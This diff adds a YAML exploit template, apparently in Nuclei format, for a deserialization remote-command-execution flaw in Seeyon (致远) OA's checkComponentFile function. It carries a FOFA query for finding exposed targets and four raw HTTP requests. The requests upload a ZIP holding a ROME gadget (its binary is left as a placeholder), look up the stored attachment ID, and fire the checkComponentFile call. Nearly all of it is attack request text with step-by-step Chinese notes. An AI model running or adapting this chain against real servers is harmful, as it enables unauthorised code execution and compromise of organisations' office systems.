@@ -1,0 +1,336 @@
+id: poc-cvv8uvkcrge00455
+info:
+  name: 致远OA checkComponentFile存在反序列化任意命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cvv8uvkcrge00455'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cvv8uvkcrge00455
+    fofa: title="致远A8-V5"
+http:
+- raw:
+  - 'POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 2721
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: JSESSIONID=B60C4B18A79FE86F7E87F8472BAA75BE; loginPageURL=; avatarImageUrl=-537588736770816621; login_locale=zh_CN
+
+    Connection: close
+
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="type"
+
+
+    0
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="extensions"
+
+
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="applicationCategory"
+
+
+    1
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="destDirectory"
+
+
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="destFilename"
+
+
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="maxSize"
+
+
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="isEncrypt"
+
+
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="callMethod"
+
+
+    insertAtt_AttCallback
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="attachmentTrId"
+
+
+    Att
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="takeOver"
+
+
+    false
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV
+
+    Content-Disposition: form-data; name="file1"; filename="rome.zip"
+
+    Content-Type: application/x-zip-compressed
+
+
+    [此处应插入ZIP文件的二进制内容]
+
+    ------WebKitFormBoundary7uKDzBJkrUpg9vNV--
+
+    **返回包如下**
+
+    ![](https://cdn.nlark.com/yuque/0/2025/webp/43110909/1766319334247-985fc26c-13d3-4830-bbb0-999a4c456fa0.webp)
+
+    **8.0以上返回包如下**
+
+    {"status":200,"message":"","att":
+
+    {"id":null,"reference":"1","subReference":"1","category":0,"type":0,"filename":"rome.ser.zip","mimeT
+
+    ype":"application/zip","createdate":"2021-08-18
+
+    17:57:35","size":"3295","description":null,"fileUrl":"-189213104274652832","extension":"zip","icon":
+
+    "zip.gif","iconFont":"rar","genesisId":null,"sort":0,"officeTransformEnable":"disable","obsObjectKey
+
+    ":"","v":"5789bd6abb9d95fdf7a03118716a903f","extraMap":
+
+    {},"new":true},"currentSize":"3295","reUpload":false,"end":true}
+
+    **上传文件的地方不止是新建流程，在 知识社区，文档中心点击新建，也可以上传文档**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /seeyon/fileUpload.do?method=processUpload&maxSize=null HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 4730
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Referer: http://xxx/seeyon/fileUpload.do?type=&firstSave=true&applicationCategory=3&extensions=&isEncrypt=false&attachmentTrId=uploadParam_16293421474560&callMethod=uploadFileForDocCallBack&takeOver=true&selectRepeatSkipOrCover=true
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: hostname=; JSESSIONID=68B48E1FCE5AE4D2B0FC91D161A1C9A2; loginPageURL=; login_locale=zh_CN; avatarImageUrl=-8730600334744729755
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="type"
+
+
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="extensions"
+
+
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="applicationCategory"
+
+
+    3
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="destDirectory"
+
+
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="destFilename"
+
+
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="maxSize"
+
+
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="isEncrypt"
+
+
+    false
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="callMethod"
+
+
+    uploadFileForDocCallBack
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="attachmentTrId"
+
+
+    uploadParam_16293421474560
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="firstSave"
+
+
+    true
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="takeOver"
+
+
+    true
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="repeat"
+
+
+    1
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
+
+    Content-Disposition: form-data; name="file1"; filename="ROME.ser.zip"
+
+    Content-Type: application/x-zip-compressed
+
+
+    [此处应插入ROME.ser.zip文件的二进制内容]
+
+    ------WebKitFormBoundaryQKpVtFYI6SiUEy8w--
+
+    **使用返回包截图中的数字，发送如下数据包，然后找到返回包中的这个数据**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /seeyon/ajax.do?method=ajaxAction&managerName=attachmentManager&rnd=32394 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+    RequestType: AJAX
+
+    Content-Length: 77
+
+    Connection: close
+
+    Cookie: JSESSIONID=B60C4B18A79FE86F7E87F8472BAA75BE; login_locale=zh_CN;
+
+    avatarImageUrl=1119439116314231940; loginPageURL=
+
+
+
+    managerMethod=getAttachmentByFileURLStrings&arguments=["2915117451250715385"]
+
+    ![](https://cdn.nlark.com/yuque/0/2025/webp/43110909/1766319334465-57b97c08-d13f-4e70-8a08-312ecd256dea.webp)
+
+    **再拿到返回包中的id数据，发送如下数据包：**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /seeyon/ajax.do?method=ajaxAction&managerName=cipComponentManager&rnd=32394 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+    RequestType: AJAX
+
+    Content-Length: 71
+
+    Connection: close
+
+    Cookie: JSESSIONID=B60C4B18A79FE86F7E87F8472BAA75BE; login_locale=zh_CN;
+
+    avatarImageUrl=1119439116314231940; loginPageURL=
+
+
+    managerMethod=checkComponentFile&arguments=["-3767740144639261915","0"]
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/webp/43110909/1766319334720-1397f285-e76e-4d2a-aee2-512393cda9b2.webp)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
